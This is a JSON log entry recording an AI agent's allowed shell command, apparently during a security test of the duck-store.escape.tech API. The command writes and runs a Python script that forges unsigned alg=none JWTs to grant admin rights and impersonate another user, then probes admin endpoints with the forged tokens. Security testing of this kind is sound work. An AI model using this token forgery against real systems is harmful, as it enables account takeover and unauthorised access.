{"ts": 1790646905.1737099, "decision_id": "c3416ffc473d", "tool": "run_shell", "allow": true, "reason": null, "target": "cat > /tmp/jwt_test2.py << 'PYEOF'\nimport jwt\nimport json\nimport base64\nimport requests\nimport sys\n\n# Original tokens\ntoken_a = \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMWMwZWZhYjctNDlmZC00YzcwLWI3MjUtMzNiODRkMDc2YjI3IiwidXNlcm5hbWUiOiJ1c2VyX2FfMDAxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3OTA2NDcxMzZ9.B-hpdwGZVA6RakD6Q5-IrhFiMrL2Oxj22XrkbwgUJ6k\"\ntoken_b = \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMTk3OWRhNjgtNzMzNS00ZTdhLWEzMmUtYWU5ZDVlOTA3NTk2IiwidXNlcm5hbWUiOiJ1c2VyX2JfMDAxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3OTA2NDcxNDF9.HimXkMB6-ISFzFcW56DBNFVIAOH6uldXNEHQJjuZY1A\"\n\nBASE = \"https://duck-store.escape.tech/api/v1\"\n\n# Decode tokens\nfor name, token in [(\"user_a\", token_a), (\"user_b\", token_b)]:\n    parts = token.split('.')\n    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=' * (-len(parts[1]) % 4)).decode())\n    print(f\"{name} payload: {payload}\")\n\n# Create alg=none token with admin role for user_a\nparts = token_a.split('.')\npayload_a = json.loads(base64.urlsafe_b64decode(parts[1] + '=' * (-len(parts[1]) % 4)).decode())\nnone_header = {\"alg\": \"none\", \"typ\": \"JWT\"}\nnone_payload = payload_a.copy()\nnone_payload[\"role\"] = \"admin\"\nnone_header_b64 = base64.urlsafe_b64encode(json.dumps(none_header).encode()).decode().rstrip('=')\nnone_payload_b64 = base64.urlsafe_b64encode(json.dumps(none_payload).encode()).decode().rstrip('=')\nnone_token_a = f\"{none_header_b64}.{none_payload_b64}.\"\nprint(f\"\\nnone token (user_a as admin): {none_token_a}\")\n\n# Create alg=none token for user_b as admin\nparts = token_b.split('.')\npayload_b = json.loads(base64.urlsafe_b64decode(parts[1] + '=' * (-len(parts[1]) % 4)).decode())\nnone_payload_b = payload_b.copy()\nnone_payload_b[\"role\"] = \"admin\"\nnone_payload_b_b64 = base64.urlsafe_b64encode(json.dumps(none_payload_b).encode()).decode().rstrip('=')\nnone_token_b = f\"{none_header_b64}.{none_payload_b_b64}.\"\nprint(f\"none token (user_b as admin): {none_token_b}\")\n\n# Create alg=none token impersonating user_b with user_a's session (IDOR test)\nimpersonate_payload = payload_a.copy()\nimpersonate_payload[\"user_id\"] = payload_b[\"user_id\"]\nimpersonate_payload[\"username\"] = payload_b[\"username\"]\nimpersonate_payload_b64 = base64.urlsafe_b64encode(json.dumps(impersonate_payload).encode()).decode().rstrip('=')\nimpersonate_token = f\"{none_header_b64}.{impersonate_payload_b64}.\"\nprint(f\"none token (user_a impersonating user_b): {impersonate_token}\")\n\n# Test 3: Algorithm confusion - sign HS256 token with public key (RS256->HS256)\n# For this we need the public key. Let's check if there's a JWKS endpoint or we can get it from /api/v1/docs\nprint(\"\\n\" + \"=\" * 60)\nprint(\"Testing endpoints with various tokens\")\nprint(\"=\" * 60)\n\nheaders = {\"Content-Type\": \"application/json\"}\n\nendpoints_to_test = [\n    \"/users/\",\n    \"/admin/users\",\n    \"/admin/orders\",\n    \"/users/me/profile\",\n    \"/products/\",\n    \"/orders/\",\n]\n\ntokens_to_test = {\n    \"user_a_original\": token_a,\n    \"user_b_original\": token_b,\n    \"user_a_none_admin\": none_token_a,\n    \"user_b_none_admin\": none_token_b,\n    \"user_a_impersonate_b\": impersonate_token,\n}\n\nfor token_name, token in tokens_to_test.items():\n    print(f\"\\n--- Testing with {token_name} ---\")\n    auth_header = {\"Authorization\": f\"Bearer {token}\", \"Content-Type\": \"application/json\"}\n    \n    for ep in endpoints_to_test:\n        try:\n            r = requests.get(f\"{BASE}{ep}\", headers=auth_header, timeout=10, verify=False)\n            print(f\"  {ep}: {r.status_code} - {r.text[:100]}\")\n        except Exception as e:\n            print(f\"  {ep}: ERROR - {e}\")\n\nPYEOF\npython3 /tmp/jwt_test2.py 2>&1"}
